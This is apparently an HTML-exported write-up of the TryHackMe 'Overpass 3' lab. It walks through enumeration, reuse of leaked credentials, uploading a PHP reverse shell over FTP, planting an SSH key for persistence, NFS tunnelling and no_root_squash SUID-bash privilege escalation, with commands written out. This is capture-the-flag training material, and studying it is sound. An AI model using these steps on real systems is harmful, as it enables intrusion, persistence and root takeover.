<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>overpass-3 hosting</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>overpass-3 hosting</h1><br/><strong><h1>THM: Overpass 3 - Hosting</h1></strong><br /><br /><br /><strong><h2>Enumeration</h2></strong><br /><br /><br /><strong><span style="text-decoration:underline;">Rustscan &amp; Nmap</span></strong><br /><br /><strong>ports=$(rustscan -g -a 10.10.201.214 --ulimit 5000 | cut -d &quot;[&quot; -f 2 | cut -d &quot;]&quot; -f 1);echo $ports<br />nmap -A -p$ports 10.10.201.214</strong><br /><img src="images/40-1.png" alt="images/40-1.png" /><br /><br /><strong><span style="text-decoration:underline;">Dirsearch</span></strong><br /><br /><strong>dirsearch -u http://10.10.201.214</strong><br /><img src="images/40-2.png" alt="images/40-2.png" /><br /><br /><strong>Website Enumeration</strong><br /><br /><img src="images/40-3.png" alt="images/40-3.png" /><br /><br />I opened the found<strong> /backups</strong> directory and found a zip file. I downloaded it locally and analyze its contents.<br /><br /><img src="images/40-4.png" alt="images/40-4.png" /><br /><br />I found a Customer Details Excel file encrypted with gpg. There is also a key file.<br />Lets use this key file to open the <strong>gpg</strong> file.<br /><br />KEY File: <strong>/home/cybex/lab/thm/CTFs/overpass-3/priv.key</strong><br />GPG File: <strong>/home/cybex/lab/thm/CTFs/overpass-3/CustomerDetails.xlsx.gpg</strong><br /><br /><strong>gpg --import priv.key</strong><br /><strong>gpg CustomerDetails.xlsx.gpg</strong><br /><br /><img src="images/40-5.png" alt="images/40-5.png" /><br /><br />We can see <strong>CustomerDetails.xlsx</strong> is <strong>extracted</strong> in the same folder. (As <strong>--decrypt</strong> option wasn&#39;t used)<br />We view the excel file.<br /><br /><img src="images/40-6.png" alt="images/40-6.png" /><br /><br />We found quite a few credentials.<br />Lets try to use these in <strong>FTP</strong><br /><br /><strong>FTP</strong><br /><img src="images/40-7.png" alt="images/40-7.png" /><br /><br />I was able to login with the following credentials.<br /><br /><strong>FTP Credentials:</strong><br />Username:	<strong>paradox</strong><br />Password:	<strong>ShibesAreGreat123</strong><br /><br />The <strong>backups</strong> directory is the same which was accessible through the web.<br /><br /><strong>Note:</strong> I tried the other 2 credentials, they are not working for the FTP server. Maybe it will work for some other service.  (May be SSH)<br /><br /><strong>SSH</strong><br />I will try to use the found credentials for SSH.<br /><br /><img src="images/40-8.png" alt="images/40-8.png" /><br /><br />As we can see none of the credentials work for <strong>SSH Login</strong> with <strong>password</strong>. But we see an important thing.<br />The Paradox account doen&#39;t allow password authentication. But it allows <strong>publickey</strong>.<br />We will check if later if we find any system access.<br /><br /><br /><strong><h2>Foothold</h2></strong><br /><br />We know that home directory of FTP is writable and it is accessible by the web server. We can upload a php-reverse-shell and open it the page in the web browser to get initial foothold of the machine.<br /><br /><strong>cp /usr/share/webshells/php/php-reverse-shell.php .</strong><br /><br />Make the necessary changes. (PORT &amp; IP)<br /><br /><strong>FTP</strong> the file in the backups directory &amp; start netcat listener.<br /><img src="images/40-9.png" alt="images/40-9.png" /><br /><br />Now, lets open the page in the browser.<br /><strong>Note:</strong> As we are putting the php file in the home directory. We will not see it when the webpage is loaded.<br /><img src="images/40-10.png" alt="images/40-10.png" /><br /><br />The way the php file can be triggered is by entering the following in the URL:<br /><strong>http://10.10.108.191/php-reverse-shell.php</strong><br /><br /><strong>Or</strong><br /><br />We create a directory(say <strong>rshell</strong>) in the base folder of FTP &amp; put our php file in it and then access the folder from the website as shown below<br /><br /><img src="images/40-11.png" alt="images/40-11.png" /><br /><br />And open in the browser as follows.<br /><img src="images/40-12.png" alt="images/40-12.png" /><br /><br /><br />Any way is used, we get a connection once the file is triggered.<br /><img src="images/40-13.png" alt="images/40-13.png" /><br /><br /><strong>Web Flag</strong><br />THM Hint: Flag belongs to apache<br />I used /etc/passwd to list all users and went to apache user&#39;s home. I found the <strong>web.flag</strong><br /><br /><img src="images/40-14.png" alt="images/40-14.png" /><br /><br /><strong><h2>Lateral Movement</h2></strong><br /><br />Remember we had a SSH password login denied. Lets try to use the paradox user&#39;s credentials to switch the user/<br /><img src="images/40-15.png" alt="images/40-15.png" /><br /><br />Indeed we are able to login. Now, lets create a <strong>authorized_key</strong> file with my personal <strong>public id</strong><br />I added my <strong>id_rsa.pub</strong> to the <strong>authorized_keys</strong> of the <strong>paradox</strong> user<br /><img src="images/40-16.png" alt="images/40-16.png" /><br /><br /><br />Now we can login with the system through <strong>SSH</strong><br /><img src="images/40-17.png" alt="images/40-17.png" /><br /><br /><strong>Linpeas</strong> Report Snap<br /><br /><strong>[+] NFS exports?<br />[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe<br />/home/james *(rw,fsid=0,sync,no_root_squash,insecure)</strong><br /><br />Running <strong>linpeas.sh</strong> on the target will reveal an interesting NFS share (<strong>/home/james</strong>), with the <strong>no_root_squash</strong> option set. We’ll come back to this later for the privilege escalation, but at this stage, we only care about the NFS share. <br /><br />Lets check for nfs<br /><br /><strong>cat /etc/exports<br />rpcinfo -p | grep nfs</strong><br /><img src="images/40-18.png" alt="images/40-18.png" /><br /><br />We find that NFS is running on port 2049. Lets check with <strong>nmap</strong><br /><img src="images/40-19.png" alt="images/40-19.png" /><br /><br /><br />As we can see, the nfs service is <strong>filtered</strong> which means its blocked by <strong>firewall</strong> for remote access.<br /><br /><strong>Solution</strong><br />We can create a SSH Tunnel to connect my machine localhost to the NFS port in the remote machine.<br /><br /><strong>ssh -L 2049:localhost:2049 paradox@10.10.108.191</strong><br /><br /><img src="images/40-20.png" alt="images/40-20.png" /><br /><br />Lets check Nmap in out Localhost at <strong>2049</strong> port.<br /><img src="images/40-21.png" alt="images/40-21.png" /><br /><br />The tunnel was successful.<br />It showing now as open in our local system.<br /><br />We can connect to the nfs share using the following.<br /><br /><strong>mount -t nfs 127.0.0.1: nfs_share</strong><br /><img src="images/40-22.png" alt="images/40-22.png" /><br /><br /><br /><strong>Important Note:</strong><br />We created SSH tunnel to default nfs port: <strong>2049</strong><br /><br /><strong>ssh -L 2049:localhost:2049 paradox@10.10.108.191</strong><br /><strong>mount -t nfs 127.0.0.1: nfs_share</strong><br /><br />That is reason mount command connected automatically.<br />Note: If we tunnel to a custom port say <strong>9999</strong><br /><br /><strong>ssh -L 9999:localhost:2049 paradox@10.10.108.191</strong><br /><strong>mount -t nfs -o port=9999 127.0.0.1: nfs_share</strong><br /><br />Then we have to use <strong>-o option</strong> in mount with <strong>key port=9999</strong> for connection.<br /><br /><br /><strong><h2>Privilege Escalation</h2></strong><br /><br /><strong>Linpeas</strong> Report Snap<br /><br /><strong>[+] NFS exports?<br />[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe<br />/home/james *(rw,fsid=0,sync,no_root_squash,insecure)</strong><br /><br />As <strong>no_root_squash</strong> is enabled. It can be used for privilege escalation.<br /><br />There are 2 approaches here: (Check <strong>CybeXRay Guides → Privilege Escalation → Linux ----→ @Content :: Using NFS</strong>)<br />We will use <strong>Method-2:</strong> which tampers a local bash executible.<br /><br /><strong>Target Machine:</strong><br />Copy the local <strong>bash</strong> executible from the target machine to the NFS share.<br />Eg.<br /><img src="images/40-23.png" alt="images/40-23.png" /><br /><br /><br /><strong>Attacker Machine:</strong><br />Connect the NFS share as root. Then check the bash executible permission.<br />Next change it to be owned by root and have SUID bit set.<br /><br /><strong>chown root:root	bash<br />chmod u+s bash</strong><br /><br />Eg.<br /><img src="images/40-24.png" alt="images/40-24.png" /><br /><br /><strong>Target Machine:</strong><br />Run the bash program with -p option to preserver the permissiom<br /><strong>./bash -p</strong><br /><br /><img src="images/40-25.png" alt="images/40-25.png" /><br /><br /><strong>Note:</strong> It will give <strong>euid root</strong> access.<br /><br />We can collect the flags and complete the THM room.<br /><br /><strong><h2>Extra</h2></strong><br /><br /><strong>Method-1</strong> will give full root access. (It uses the <strong>StrongRoot</strong> program instead of the local bash)<br />(Check <strong>CybeXRay Guides → Privilege Escalation → Linux ----→ @Content :: Using NFS</strong>)<br /><br /><strong>Note:</strong> If Full Root Access is required check: (<strong>CybeXRay Guides → Wiki Miscellaneous → StrongRoot</strong>)<br /><br />Thanks!!<br /><br /></div>
</body>
</html>
